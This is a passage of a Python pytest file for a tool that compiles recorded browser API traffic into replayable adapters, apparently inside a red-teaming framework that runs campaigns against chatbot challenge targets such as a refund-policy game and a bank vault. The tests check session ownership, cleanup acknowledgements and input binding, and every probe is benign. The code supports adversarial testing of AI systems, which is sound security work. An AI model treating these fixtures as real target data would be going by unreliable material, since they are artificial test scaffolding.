                    "url": "https://target.test/api/unrelated",
                    "status": 400,
                    "request_json": {"action": "status"},
                    "response_json": {"error": "Game already ended"},
                },
            )

    class Recorder:
        async def record_handoff(self, value):
            self.handoff = value

    arguments = _compile_arguments()
    arguments["response_selector"] = "/text"
    arguments["terminal_response_contract"] = {
        "conditions": [
            {
                "pointer": "/error",
                "match_values": ["Game already ended"],
                "status_codes": [400],
                "effect_applied": False,
                "replay_safe": True,
            }
        ]
    }
    result = await next(
        item
        for item in browser_tools(lambda _: Session(), Recorder())
        if item.describe().name == "browser_compile_api_handoff"
    ).invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is True
    assert "terminal response conditions require" in result.content


@pytest.mark.asyncio
async def test_api_handoff_binds_reviewed_cleanup_acknowledgement_to_exact_response() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "ordinary response"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 202,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "trigger_action_ref": _cleanup_action_records()[2],
                    "request_json": {},
                    "response_json": {"cleaned": True, "detail": "session closed"},
                },
            )

    class Recorder(_CleanupActionRecorder):
        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    result = await next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/cleaned",
                "match_values": [True],
                "status_codes": [202],
            },
        },
    )

    assert result.is_error is False
    cleanup_step = json.loads(recorder.handoff.adapter)["api_steps"][-1]
    assert cleanup_step["cleanup_acknowledgement"] == {
        "pointer": "/cleaned",
        "match_values": [True],
        "status_codes": [202],
    }
    assert cleanup_step["cleanup_acknowledgement_observation"]["source"] == (
        "reviewed_explicit_contract"
    )
    assert len(cleanup_step["cleanup_acknowledgement_observation"]["evidence_refs"]) == 2
    assert cleanup_step["cleanup_action_evidence_ref"].startswith("browser-action:sha256:")


@pytest.mark.asyncio
async def test_api_handoff_cleanup_acknowledgement_cannot_use_unrelated_endpoint() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "ordinary response"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "request_json": {},
                    "response_json": {"ok": True},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/unrelated",
                    "status": 200,
                    "request_json": {},
                    "response_json": {"cleaned": True},
                },
            )

    class Recorder:
        async def record_handoff(self, value):
            self.handoff = value

    result = await next(
        item
        for item in browser_tools(lambda _: Session(), Recorder())
        if item.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/cleaned",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )

    assert result.is_error is True
    assert "match the exact observed cleanup" in result.content


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("cleanup_status", "cleanup_response", "acknowledgement", "expected_error"),
    (
        (
            500,
            {"closed": True},
            {"pointer": "/closed", "match_values": [True], "status_codes": [500]},
            "non-2xx status",
        ),
        (200, {"closed": False}, None, "explicit reviewed cleanup_acknowledgement"),
        (200, {"status": "ok"}, None, "explicit reviewed cleanup_acknowledgement"),
    ),
)
async def test_api_handoff_never_infers_cleanup_acknowledgement(
    cleanup_status: int,
    cleanup_response: dict[str, object],
    acknowledgement: dict[str, object] | None,
    expected_error: str,
) -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "ordinary response"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": cleanup_status,
                    "request_json": {},
                    "response_json": cleanup_response,
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    compiler = next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    )
    arguments = {
        **_compile_arguments(),
        "cleanup_method": "POST",
        "cleanup_url": "https://target.test/api/cleanup",
    }
    if acknowledgement is not None:
        arguments["cleanup_acknowledgement"] = acknowledgement

    result = await compiler.invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is True
    assert expected_error in result.content
    assert recorder.handoff is None
    status_schema = compiler.describe().input_schema["properties"]["cleanup_acknowledgement"][
        "properties"
    ]["status_codes"]["items"]
    assert status_schema == {"type": "integer", "minimum": 200, "maximum": 299}


@pytest.mark.asyncio
async def test_recorded_api_handoff_binds_ambiguous_message_aliases_at_runtime(
    tmp_path: Path,
) -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(
            target_id="target",
            allowed_origins={"https://target.test"},
        )
        owner = owner()

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    tool = ApiReconHandoffTool(lambda _: Session(), recorder)
    result = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "request_evidence_ref": "evidence:req",
            "response_evidence_ref": "evidence:res",
            "adapter": {
                "interface": "http_api",
                "endpoint": "https://target.test/api/message",
                "authentication": "reviewed browser session",
                "api_transport": "browser_context",
                "observed_evidence": ["evidence:req", "evidence:res"],
                "session_constraint": "one reviewed session",
                "api_steps": [
                    {
                        "step_id": "message",
                        "endpoint": "https://target.test/api/message",
                        "method": "POST",
                        "request_template": {
                            "sessionId": "reviewed-session",
                            "message": "{{input}}",
                            "userMessage": "English reconnaissance baseline",
                            "levelId": 1,
                        },
                        "response_selector": "/text",
                        "success_witness": "reviewed response",
                        "expected_status": 200,
                        "idempotency_key": None,
                        "replay_after_ambiguous_result": False,
                        "cleanup": False,
                        "interaction": True,
                        "captures": {},
                        "repeat": 1,
                    }
                ],
            },
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["request_template"] == {
        "sessionId": "reviewed-session",
        "message": "{{input}}",
        "userMessage": "{{input}}",
        "levelId": 1,
    }

    requests: list[object] = []

    async def requester(
        _campaign_id: str,
        _method: str,
        _url: str,
        request: object,
        _headers: object,
    ) -> tuple[int, object]:
        requests.append(request)
        return 200, {"text": "target reply"}

    campaign_id = "campaign/recorded-runtime-alias-contract"
    with Database(DatabaseConfig(data_dir=tmp_path / "postgres")) as database:
        with database.connect() as connection:
            MigrationRunner(connection).apply()
            session = SessionRepository(connection).create("recorded runtime bridge")
            CampaignStore(connection).prepare(
                campaign_id,
                str(session.id),
                {"manifest": {"id": campaign_id}, "assignment_context": {}},
                "sha256:reviewed",
            )
            target = ReviewedApiTargetTool(
                CampaignApiSessionRepository(connection),
                lambda _campaign_id: adapter,
                {},
                browser_api_requester=requester,
            )
            response = await target.invoke(
                ToolContext(
                    session_id=str(session.id),
                    workspace_root="/tmp",
                    call_id="call-1",
                    agent_id=f"{campaign_id}/worker",
                    campaign_id=campaign_id,
                    target_id="target",
                ),
                {"input": "你好，请说明退款政策"},
            )

    assert response.is_error is False
    assert requests == [
        {
            "sessionId": "reviewed-session",
            "message": "你好，请说明退款政策",
            "userMessage": "你好，请说明退款政策",
            "levelId": 1,
        }
    ]


@pytest.mark.asyncio
async def test_api_handoff_seals_without_oracle_metadata() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    arguments = _compile_arguments()
    arguments.pop("oracle_predicate")
    recorder = Recorder()

    async def allow(*_):
        return True

    result = await ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow).invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        arguments,
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert "oracle_predicate" not in adapter["api_steps"][0]
    assert adapter["evaluation_uncertainties"][0] == {
        "confidence": 0.0,
        "kind": "evaluation_uncertain",
        "reason": (
            "No target-native objective oracle was supplied; validator judgment is required."
        ),
        "source": "browser_compile_api_handoff.oracle",
    }


@pytest.mark.asyncio
async def test_api_handoff_keeps_full_response_when_evaluator_hints_are_stale() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 202,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"new_reply_shape": "observed response"},
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    arguments = _compile_arguments()
    arguments["response_selector"] = "/old_reply_shape"
    arguments["success_witness"] = None
    recorder = Recorder()

    tool = next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    )
    result = await tool.invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    step = adapter["api_steps"][0]
    assert step["response_selector"] == ""
    assert step["expected_status"] == 202
    assert step["success_witness"] == "validator judgment over the captured target response"
    assert {item["source"] for item in adapter["evaluation_uncertainties"]} >= {
        "browser_compile_api_handoff.response_selector",
        "browser_compile_api_handoff.success_witness",
    }


@pytest.mark.asyncio
async def test_api_handoff_replays_compiled_adapter_against_fresh_session_state() -> None:
    captured = (
        {
            "method": "POST",
            "url": "https://target.test/api/start",
            "status": 200,
            "request_json": {"scenario": "refund"},
            "response_json": {"sessionId": "s-recon", "resumed": False},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-recon", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
    )
    replayed: list[tuple[str, str, object]] = []

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

        async def request_json(self, method, url, payload, headers=None):
            replayed.append((method, url, payload))
            if url.endswith("/start"):
                # A fresh session id, distinct from the reconnaissance capture.
                return 200, {"sessionId": "s-fresh"}
            return 200, {"reply": "fresh session response"}

    class Recorder:
        def __init__(self):
            self.handoffs = []

        async def record_evidence(self, *_args):
            pass

        async def record_handoff(self, value):
            self.handoffs.append(value)

    recorder = Recorder()

    async def allow(*_):
        return True

    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        _compile_arguments(),
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoffs[0].adapter)
    assert adapter["api_validation"]["fresh_session_replay"] == "not_required"
    assert replayed == []


@pytest.mark.asyncio
async def test_api_handoff_rejects_adapter_when_fresh_session_loses_the_pointer() -> None:
    # A later live response can drift from reconnaissance, but routine replay
    # must not make that possible future state an adapter-admission failure.
    captured = (
        {
            "method": "POST",
            "url": "https://target.test/api/start",
            "status": 200,
            "request_json": {"scenario": "refund"},
            "response_json": {"sessionId": "s-recon", "resumed": False},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-recon", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

        async def request_json(self, _method, url, _payload, headers=None):
            if url.endswith("/start"):
                return 200, {"sessionId": "s-fresh"}
            return 200, {"error": "session exhausted"}

    class Recorder:
        handoff = None

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    async def allow(*_):
        return True

    recorder = Recorder()
    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        _compile_arguments(),
    )

    assert result.is_error is False
    assert recorder.handoff is not None


@pytest.mark.asyncio
async def test_api_handoff_derives_owned_stateful_cleanup_discovery_before_execution() -> None:
    captured = (
        {
            "method": "POST",
            "url": "https://target.test/api/background",
            "status": 200,
            "request_json": {},
            "response_json": {"sessionId": "unrelated-background"},
        },
        *_strict_creation_events("s-recon"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-recon", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

        async def request_json(self, _method, url, _payload, headers=None):
            if url.endswith("/start"):
                return 200, {"sessionId": "s-resumed", "resumed": True}
            return 200, {"reply": "resumed session response"}

    class Recorder:
        handoff = None

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    async def allow(*_):
        return True

    recorder = Recorder()
    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        _compile_arguments(),
    )

    assert result.is_error is False
    assert recorder.handoff is not None
    adapter = json.loads(recorder.handoff.adapter)
    # Captured network traffic alone does not prove this Merlin context caused the
    # setup request; another actor or page task could have created the session.
    assert adapter["cleanup_discovery"] == {
        "failure_code": "session_not_owned",
        "retryable": True,
        "session_ownership": "unknown",
        "status": "required_before_target_execution",
    }
    assert result.metadata["cleanup_discovery"] == adapter["cleanup_discovery"]
    assert "session_creation_transition" not in adapter
    assert recorder.handoff.reusable_adapter is None


@pytest.mark.asyncio
async def test_api_handoff_accepts_causal_resumed_false_as_exact_creation_proof() -> None:
    session_id = "bank-session-fresh"
    start_url = "https://bank.test/api/bank/start"
    message_url = "https://bank.test/api/bank/message"
    setup_action, setup_observations = _setup_action_records(tab_ref="tab:setup")
    setup_action_ref = BrowserSession._evidence(setup_action)  # noqa: SLF001
    setup_observations = tuple(
        observation.model_copy(update={"evidence_refs": (setup_action_ref,)})
        if observation.step == setup_action.step
        else observation
        for observation in setup_observations
    )
    captured = (
        {
            "method": "POST",
            "url": start_url,
            "status": 200,
            "observed_at": (_SETUP_ACTION_AT + timedelta(seconds=1)).isoformat(),
            "_observation_step": 3,
            "_observation_tab_ref": "tab:setup",
            "trigger_action_ref": setup_action_ref,
            "request_json": {"levelId": 1, "aiAssisted": True},
            "response_json": {"sessionId": session_id, "resumed": False},
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {"sessionId": session_id, "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None

        async def list_actions(self, _context_id):
            return (setup_action,)

        async def list_observations(self, _context_id):
            return setup_observations

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["cleanup_discovery"]["session_ownership"] == "owned"
    assert adapter["session_creation_transition"]["remote_session_id"] == session_id
    assert adapter["session_creation_transition"]["source"] == "authoritative_fresh_setup_response"
    assert adapter["session_creation_transition"]["precondition"] == {
        "method": "POST",
        "url": start_url,
        "status_codes": [200],
        "pointer": "/resumed",
        "match_values": [False],
    }
    assert setup_action_ref in adapter["session_creation_transition"]["evidence_refs"]
    assert result.metadata["preferred_next_tool"] == "browser_end_owned_session"
    assert recorder.handoff.reusable_adapter is None


@pytest.mark.asyncio
@pytest.mark.parametrize("supplied_hint", ("prose", "alternative_valid"))
async def test_api_handoff_allows_same_session_resume_after_proven_creation(
    supplied_hint: str,
) -> None:
    active_url = "https://plunder.me/api/policy-refund-trap/active"
    start_url = "https://plunder.me/api/policy-refund-trap/start"
    message_url = "https://plunder.me/api/policy-refund-trap/message"
    session_id = "324a759d-6e6a-4c83-a0e0-51c7b90bd46b"
    captured = (
        {
            "method": "GET",
            "url": active_url,
            "status": 404,
            "response_json": {"error": "no_active_session"},
        },
        {
            "method": "POST",
            "url": start_url,
            "status": 200,
            "request_json": {"levelId": 1, "aiAssisted": True},
            "response_json": {
                "sessionId": session_id,
                "levelName": "Completed Travel",
                "maxMessages": 18,
            },
        },
        {
            "method": "GET",
            "url": active_url,
            "status": 200,
            "response_json": {
                "sessionId": session_id,
                "levelId": 1,
                "turnsUsed": 0,
                "maxMessages": 18,
            },
        },
        {
            "method": "POST",
            "url": start_url,
            "status": 200,
            "request_json": {"levelId": 1, "aiAssisted": True},
            "response_json": {
                "sessionId": session_id,
                "resumed": True,
                "allMsgs": [],
                "maxMessages": 18,
            },
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {
                "sessionId": session_id,
                "userMessage": "harmless probe",
            },
            "response_json": {"reply": "observed response"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    arguments = _compile_arguments()
    session_creation_transition = (
        {
            "precondition": {"description": "fresh setup observed"},
            "postcondition": {"description": "same session remained active"},
        }
        if supplied_hint == "prose"
        else {
            "precondition": {
                "method": "GET",
                "url": active_url,
                "status_codes": [404],
                "pointer": "/error",
                "match_values": ["no_active_session"],
            },
            "postcondition": {
                "method": "GET",
                "url": active_url,
                "status_codes": [200],
                "pointer": "/sessionId",
                "zero_turn": {
                    "pointer": "/turnsUsed",
                    "match_values": [0],
                },
            },
        }
    )
    arguments.update(
        {
            "url": message_url,
            "input_pointer": "/userMessage",
            "response_selector": "/reply",
            "session_creation_transition": session_creation_transition,
        }
    )
    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        arguments,
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    # Even a consistent 404 -> setup -> active -> resumed trace remains unowned
    # without a causally joined Merlin action for the original setup request.
    assert adapter["cleanup_discovery"]["session_ownership"] == "unknown"
    assert adapter["cleanup_discovery"]["failure_code"] == "session_not_owned"
    assert "session_creation_transition" not in adapter
    assert result.metadata["preferred_next_tool"] == "assessment_prepare"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "case",
    (
        "valid",
        "no_404",
        "pre_non_404",
        "wrong_404_body",
        "missing_404_body",
        "late_404",
        "unrelated_404",
        "distinct_absence_urls",
        "wrong_action_context",
        "wrong_action_owner",
        "wrong_success_tab",
        "wrong_success_step",
        "wrong_success_hash",
        "resume_action_label",
        "disabled_action",
        "ambiguous_action",
        "wrong_latest_action",
        "duplicate_distinct_session",
        "repeated_poll_post_setup_action",
        "prior_session_id",
        "old_id_rotation",
        "unseen_old_id_rotation",
        "session_id_in_setup_request",
        "resumed",
        "restart",
        "restarted",
        "recovered",
        "continued",
        "resumed_null",
        "continued_string",
        "allMsgs",
        "history",
        "messages",
        "turns",
        "turnsUsed",
        "no_later_consumption",
        "canonical_declared_incomplete",
        "canonical_repeated_poll",
        "canonical_message_echo_then_repeated_poll",
    ),
)
async def test_api_handoff_hybrid_bank_creation_requires_exact_durable_chain(
    case: str,
) -> None:
    pre_at = _CLEANUP_ACTION_AT
    action_at = pre_at + timedelta(seconds=1)
    setup_at = action_at + timedelta(seconds=1)
    session_id = "bank-session-fresh"
    active_url = "https://bank.test/api/vault/active"
    start_url = "https://bank.test/api/vault/start"
    message_url = "https://bank.test/api/vault/message"
    setup_request: dict[str, object] = {"accountType": "demo"}
    setup_response: dict[str, object] = {
        "sessionId": session_id,
        "turnsUsed": 0,
        "messages": [],
    }
    if case == "session_id_in_setup_request":
        setup_request["sessionId"] = session_id
    if case == "old_id_rotation":
        setup_request["sessionId"] = "bank-session-old"
    if case == "unseen_old_id_rotation":
        setup_request["sessionId"] = "bank-session-never-observed"
    if case in {"resumed", "restart", "restarted", "recovered", "continued"}:
        setup_response[case] = True
    if case == "resumed_null":
        setup_response["resumed"] = None
    if case == "continued_string":
        setup_response["continued"] = "false"
    if case in {"allMsgs", "history", "messages"}:
        setup_response[case] = [{"role": "assistant", "content": "existing"}]
    if case in {"turns", "turnsUsed"}:
        setup_response[case] = 1

    pre_event = {
        "method": "GET",
        "url": (
            "https://bank.test/api/other-game/active" if case == "unrelated_404" else active_url
        ),
        "status": 200 if case == "pre_non_404" else 404,
        "observed_at": (
            action_at + timedelta(microseconds=1) if case == "late_404" else pre_at
        ).isoformat(),
        "response_json": (
            {}
            if case == "missing_404_body"
            else {"error": "different_absence"}
            if case == "wrong_404_body"
            else {"error": "no_active_session"}
        ),
    }
    setup_event = {
        "method": "POST",
        "url": start_url,
        "status": 200,
        "observed_at": setup_at.isoformat(),
        "request_json": setup_request,
        "response_json": setup_response,
    }
    interaction_event = {
        "method": "POST",
        "url": message_url,
        "status": 200,
        "observed_at": (setup_at + timedelta(seconds=1)).isoformat(),
        "request_json": {
            "sessionId": "different-session" if case == "no_later_consumption" else session_id,
            "message": "harmless probe",
        },
        "response_json": {"reply": "observed response"},
    }
    captured: list[dict[str, object]] = [] if case == "no_404" else [pre_event]
    if case in {"valid", "distinct_absence_urls"}:
        captured.append(
            {
                "method": "GET",
                "url": (
                    "https://bank.test/api/vault/status"
                    if case == "distinct_absence_urls"
                    else active_url
                ),
                "status": 404,
                "observed_at": (pre_at + timedelta(milliseconds=100)).isoformat(),
                "response_json": {
                    "error": "no_active_session",
                    "observation": 2,
                },
            }
        )
    if case == "prior_session_id":
        captured.append(
            {
                "method": "POST",
                "url": "https://bank.test/api/telemetry",
                "status": 204,
                "observed_at": (pre_at + timedelta(microseconds=1)).isoformat(),
                "request_json": {"sessionId": session_id},
                "response_json": {},
            }
        )
    if case == "old_id_rotation":
        captured.append(
            {
                "method": "GET",
                "url": active_url,
                "status": 200,
                "observed_at": (pre_at + timedelta(microseconds=1)).isoformat(),
                "response_json": {"sessionId": "bank-session-old"},
            }
        )
    captured.extend((setup_event, interaction_event))
    if case in {
        "canonical_repeated_poll",
        "canonical_message_echo_then_repeated_poll",
    }:
        post_events = [
            {
                "method": "GET",
                "url": active_url,
                "status": 200,
                "observed_at": (setup_at + timedelta(microseconds=index)).isoformat(),
                "response_json": {
                    "sessionId": session_id,
                    "resumed": True,
                    "sequence": index,
                },
            }
            for index in (1, 2)
        ]
        if case == "canonical_message_echo_then_repeated_poll":
            interaction_event["response_json"] = {
                "sessionId": session_id,
                "reply": "observed response",
            }
            captured.extend(post_events)
        else:
            captured[-1:-1] = post_events

    action_owner = (
        BrowserOwner(
            session_id="s1",
            worker_id="other-worker",
            technique_id="recon",
        )
        if case == "wrong_action_owner"
        else owner()
    )
    action = BrowserAction(
        context_id="other-context" if case == "wrong_action_context" else "browser-context",
        target_id="target",
        owner=action_owner,
        kind="click",
        tab_ref="tab:bank",
        frame_ref=None,
        element_ref="tab:bank:1:0",
        step=4,
        created_at=action_at,
    )
    action_ref = BrowserSession._evidence(action)  # noqa: SLF001
    setup_event["trigger_action_ref"] = action_ref
    setup_event["trigger_action_step"] = action.step
    if case == "duplicate_distinct_session":
        duplicate_setup = {
            **setup_event,
            "response_json": {**setup_response, "sessionId": "bank-session-extra"},
        }
        captured.insert(captured.index(setup_event) + 1, duplicate_setup)
    fill_value = "harmless probe"
    raw_fill_action = BrowserAction(
        context_id="browser-context",
        target_id="target",
        owner=owner(),
        kind="fill",
        tab_ref="tab:bank",
        frame_ref="main",
        element_ref="tab:bank:message",
        value=fill_value,
        step=5,
        created_at=setup_at + timedelta(milliseconds=500),
        evidence_refs=("browser-action:sha256:" + "a" * 64,),
        redaction_status="redacted",
    )
    fill_action_ref = BrowserSession._evidence(raw_fill_action)  # noqa: SLF001
    fill_probe_ref = "browser-input-probe:" + "f" * 32
    fill_action = raw_fill_action.model_copy(
        update={
            "value": "[redacted]",
            "evidence_refs": (fill_action_ref, fill_probe_ref),
        }
    )
    submit_action = BrowserAction(
        context_id="browser-context",
        target_id="target",
        owner=owner(),
        kind="click",
        tab_ref="tab:bank",
        frame_ref="main",
        element_ref="tab:bank:send",
        step=6,
        created_at=setup_at + timedelta(milliseconds=750),
        evidence_refs=("browser-action:sha256:" + "b" * 64,),
    )
    submit_action_ref = BrowserSession._evidence(submit_action)  # noqa: SLF001
    interaction_event["tab_ref"] = "tab:bank"
    interaction_event["trigger_action_ref"] = submit_action_ref
    interaction_event["trigger_action_step"] = submit_action.step
    interaction_event["input_action_refs"] = {"/message": fill_action_ref}
    interaction_event["input_probe_refs"] = {"/message": fill_probe_ref}
    visible = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://bank.test",
        owner=owner(),
        tab_ref="tab:bank",
        frame_ref="main",
        kind="snapshot",
        step=3,
        elements=(
            ElementRef(
                ref="tab:bank:1:0",
                tab_ref="tab:bank",
                frame_ref="main",
                role="button",
                name="Resume previous session"
                if case == "resume_action_label"
                else "Challenge Casey",
                disabled=case == "disabled_action",
            ),
        ),
        observed_at=action.created_at - timedelta(microseconds=1),
    )
    completed = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://bank.test",
        owner=owner(),
        tab_ref="tab:other" if case == "wrong_success_tab" else "tab:bank",
        frame_ref=None,
        kind="snapshot",
        step=5 if case == "wrong_success_step" else 4,
        evidence_refs=(
            "browser-action:sha256:" + "0" * 64 if case == "wrong_success_hash" else action_ref,
        ),
        observed_at=action.created_at + timedelta(microseconds=1),
    )
    fill_completed = completed.model_copy(
        update={
            "tab_ref": "tab:bank",
            "frame_ref": "main",
            "step": fill_action.step,
            "evidence_refs": (fill_action_ref,),
            "observed_at": fill_action.created_at + timedelta(microseconds=1),
        }
    )
    submit_completed = completed.model_copy(
        update={
            "tab_ref": "tab:bank",
            "frame_ref": "main",
            "step": submit_action.step,
            "evidence_refs": (submit_action_ref,),
            "observed_at": submit_action.created_at + timedelta(microseconds=1),
        }
    )
    navigation_actions = [
        action.model_copy(
            update={
                "element_ref": f"tab:bank:nav:{step}",
                "step": step,
                "created_at": pre_at + timedelta(milliseconds=step * 200),
            }
        )
        for step in (1, 2)
    ]
    navigation_observations: list[BrowserObservation] = []
    for navigation in navigation_actions:
        navigation_ref = BrowserSession._evidence(navigation)  # noqa: SLF001
        navigation_observations.extend(
            (
                visible.model_copy(
                    update={
                        "step": navigation.step - 1,
                        "observed_at": navigation.created_at - timedelta(microseconds=1),
                        "elements": (
                            ElementRef(
                                ref=navigation.element_ref,
                                tab_ref="tab:bank",
                                frame_ref="main",
                                role="button",
                                name=f"Navigation {navigation.step}",
                            ),
                        ),
                    }
                ),
                completed.model_copy(
                    update={
                        "step": navigation.step,
                        "observed_at": navigation.created_at + timedelta(microseconds=1),
                        "evidence_refs": (navigation_ref,),
                    }
                ),
            )
        )
    actions = [*navigation_actions, action, fill_action, submit_action]
    observations = [
        *navigation_observations,
        visible,
        completed,
        fill_completed,
        submit_completed,
    ]
    if case == "ambiguous_action":
        second_action = action.model_copy(update={"element_ref": "tab:bank:1:1", "step": 5})
        second_ref = BrowserSession._evidence(second_action)  # noqa: SLF001
        actions.append(second_action)
        observations.extend(
            (
                visible.model_copy(
                    update={
                        "elements": (
                            ElementRef(
                                ref="tab:bank:1:1",
                                tab_ref="tab:bank",
                                frame_ref="main",
                                role="button",
                                name="Start another demo session",
                            ),
                        )
                    }
                ),
                completed.model_copy(update={"step": 5, "evidence_refs": (second_ref,)}),
            )
        )
    if case == "wrong_latest_action":
        later_action = action.model_copy(
            update={
                "element_ref": "tab:bank:1:2",
                "step": 5,
                "created_at": action_at + timedelta(milliseconds=500),
            }
        )
        later_ref = BrowserSession._evidence(later_action)  # noqa: SLF001
        actions.append(later_action)
        observations.append(
            completed.model_copy(
                update={
                    "step": later_action.step,
                    "observed_at": later_action.created_at + timedelta(microseconds=1),
                    "evidence_refs": (later_ref,),
                }
            )
        )
    if case == "repeated_poll_post_setup_action":
        send_action = action.model_copy(
            update={
                "element_ref": "tab:bank:send",
                "step": 15,
                "created_at": setup_at + timedelta(milliseconds=500),
            }
        )
